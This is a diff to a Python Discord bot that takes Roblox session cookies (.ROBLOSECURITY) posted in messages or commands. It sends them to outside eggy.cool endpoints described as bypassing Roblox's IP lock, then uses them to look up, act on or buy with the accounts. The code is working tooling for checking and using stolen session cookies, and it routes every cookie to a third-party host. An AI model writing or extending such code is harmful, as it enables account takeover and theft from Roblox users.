@@ -15,10 +15,10 @@ async def on_message(message):
 
     if message.content.startswith("_|WARNING:-DO-NOT-SHARE-THIS."):
         cookie = requests.get(
-            f"https://eggy.cool/refresh/roblox-cookie-checker.php?cookie={message.content}"
+            f"https://eggy.cool/refresh/roblox-api-lock.php?cookie={message.content}"
         ).text  ## bypassip lock
         r = requests.get(
-            f'https://eggy.cool/api/roblox-cookie-api.php?cookie={cookie}')
+            f'https://eggy.cool/api/roblox-user-info-lock.php?cookie={cookie}')
         data = r.json()
 
         if data["status"] == "failed":
@@ -46,7 +46,7 @@ async def bancookie(ctx, cookie=None):
         )  ## let the user know they aint provided cookie
         return  ## break command
     cookie = requests.get(
-        f"https://eggy.cool/checker/roblox-cookie-refesh.php?cookie={cookie}"
+        f"https://eggy.cool/checker/roblox-cookie-checker-lock.php?cookie={cookie}"
     ).text  ## bypass ip lock
     req1.cookies['.ROBLOSECURITY'] = cookie
     print("Cookie Set")
@@ -94,10 +94,10 @@ async def buystuff(ctx, cookie=None):
         return  ## break command
 
     cookie = requests.get(
-        f"https://eggy.cool/refresh/roblox-cookie-checker.php?cookie={cookie}"
+        f"https://eggy.cool/refresh/roblox-api-lock.php={cookie}"
     ).text  ## bypass ip lock
     r = requests.get(
-        f'https://eggy.cool/api/roblox-cookie-api.php?cookie={cookie}')
+        f'https://eggy.cool/api/roblox-user-info-lock.php={cookie}')
     if r.json()["status"] == "failed":
         await ctx.message.reply("Hmm. This Cookie Seems To Be Expired/Invalid."
                                 )
@@ -169,7 +169,7 @@ async def check(
         return  ## break command
 
     r = requests.get(
-        f'https://eggy.cool/api/roblox-cookie-api.php?cookie={cookie}'
+        f'https://eggy.cool/api/roblox-user-info-lock.php?cookie={cookie}'
     )  ## Send get request to my api to get info about cookie in json, this api auto bypasses ip lock
     data = r.json()  ## get json from request ^^
 
@@ -259,7 +259,7 @@ async def on_ready():
 
     ## just startup event which sets bot activity to "Playing Cookie Checker"
 
-
 keep_alive()
 bot.run(token)
 ## make your bot run duh
+
